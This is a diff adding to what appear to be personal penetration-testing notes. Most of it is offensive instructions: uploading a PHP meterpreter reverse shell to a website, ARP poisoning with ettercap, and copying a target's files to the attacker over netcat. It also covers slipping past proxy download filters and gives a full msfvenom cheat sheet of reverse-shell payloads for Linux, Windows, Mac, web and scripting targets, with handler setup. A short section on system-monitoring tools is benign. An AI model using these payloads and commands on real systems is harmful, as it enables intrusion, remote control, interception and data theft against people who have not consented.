@@ -311,16 +311,132 @@ PS Always look at auxiliary/scanner/ for enumerators in metasploit
          >msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPOTR=6000 -e php/base64 -f raw > exploit.php
           With -f i can precise format (i could use .exe for example if i don`t whant to use php exploit).
           The ip 10.0.2.15 is the attacker address. 
-    2. Add to exploit.php == <?php in the begining of the file and ?> to the end 
-    3. Upload that payload to the web page 
-    4. use exploit/multi/handler on msfconsole 
-    5. Set LHOST and LPOTR like in peyload (attacker ip and listening port) 
-    6. exploit 
-    7. go to the uploaded file www.lol.pl/uploadfiles/exploit.php 
-    8. That is it. I got meterpreter console on metasploit :) 
+      2. Add to exploit.php == <?php in the begining of the file and ?> to the end 
+      3. Upload that payload to the web page 
+      4. use exploit/multi/handler on msfconsole 
+      5. Set LHOST and LPOTR like in peyload (attacker ip and listening port) 
+      6. exploit 
+      7. go to the uploaded file www.lol.pl/uploadfiles/exploit.php 
+      8. That is it. I got meterpreter console on metasploit :) 
+
+5. Can I Arp Poison (Sniffing)
+• direct all communication from target to attacker system:
+  >etercap -T -M arp:oneway /192.168.1.100/ 
+• for more, I can use programs like "Dsnif" or "Cain and Able" 
+• etercap is also good for dns spoof (it is possible to use a graphical interface etercap) 
 
 
+MANY MORE
 
+• Dirs
+/usr/share/wordlists
+/etc/rc.d
+/var/log
+/etc/nologin
+/etc/fstab
+/var/spool/mail
+/etc/securetty
+/var/mail "standard for fetchmail"
+/var/tmp
+/proc "many things from that == process information pseudo-file system"
+/dev/null "trash conteiner for many crontab tasks"
 
+• File_transer_by_Netcat
+    - Create a listener on Mine machine and pipe the traffic from the input into a file
+      >nc -lvvp 4444 > file_to_download.txt
+       -l == State that we are going to be listening
+       -vv == Show extra verbosity
+       -p == We are going to supply a port for listening
+       4444 == This is the port will be listening on
+     - Back on the ssh session of the target machine we are going to transfer the file through netcat to the listening 
+       port on our local machine
+       >nc -nvv 192.168.1.141 4444 < file_to_download.txt
+        -n == do not resolve IP address using DNS
+     - Be aware that netcat will not tell you once the file has finished transferring. It is a good idea to open 
+       another shell and do ls -ls salary_dec2004.csv.enc to check when the file has stopped increasing in size.
+
+• How to download ".exe", ".gz" and ".zip" when they blocked
+Fortunately, most proxy administrators can not write regular expressions very well. At one site I know (let's call them BigAcme corporation), the proxies check for URL that end in the well known extensions ".exe", ".gz" and ".zip". Nobody cared to inform the proxy admins that bzip2 exists, so downloading ".bz2" files is allowed... :-). Furthermore, since URLs are allowed to contain a "query string" (for passing in form field values through an HTTP GET), adding a "?x" to a download URL fools the regular expression filters but does not destroy the validity of the URL. More often than not, the server on the other side processes the query string and then happily ignores it. I have downloaded many a vendor patch and open source product that way.
+
+• Monitoring My System
+  -- TCPView (Windows)
+    TCPView is a Windows program that will show you detailed listings of all TCP and UDP endpoints on your system, 
+    including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView 
+    also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented
+    subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon, a command-line version with
+    the same functionality.
+    - on Linux i can use Wireshark
+  -- Autoruns (Windows)
+    This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, 
+    shows you what programs are configured to run during system bootup or login, and when you start various built-in 
+    Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones 
+    in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, 
+    browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond 
+    other autostart utilities.
+    Autoruns' Hide Signed Microsoft Entries option helps you to zoom in on third-party auto-starting images that have been 
+    added to your system and it has support for looking at the auto-starting images configured for other accounts configured 
+    on a system. Also included in the download package is a command-line equivalent that can output in CSV format, Autorunsc.
+    - on Linux:
+      1. ps aux | less
+      2. top ==> h for help
+      3. pstree ==> shows running processes as a tree
+      4. ps -eM ==> get security info
+      5. atop and htop also are weary useful tools
+   -- DriverView (Windows)
+     DriverView utility displays the list of all device drivers currently loaded on your system. For each driver in the list,
+     additional useful information is displayed: load address of the driver, description, version, product name, company 
+     that created the driver, and more.
+     - for Linux i can use great tool like "inxi" (use -F for full information, in man is match more information about it)
+   -- System File Checker (Windows)
+      Repair missing or corrupted system files. It is preinstalled on new Windows
+      for help 
+      >sfc /?
+      for scan 
+      >sfc /scannow
+      - for Linux "Tripwire open source". It is much more then checker because it is a free IDS system
+
+• msfvenom OPERATION
+Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.
+List payloads
+msfvenom -l
+Binaries
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+Mac
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+Web Payloads
+PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+Scripting Payloads
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+Shellcode
+For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+Linux Based Shellcode
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+Windows Based Shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+Mac Based Shellcode
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language> Handlers
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
 
 
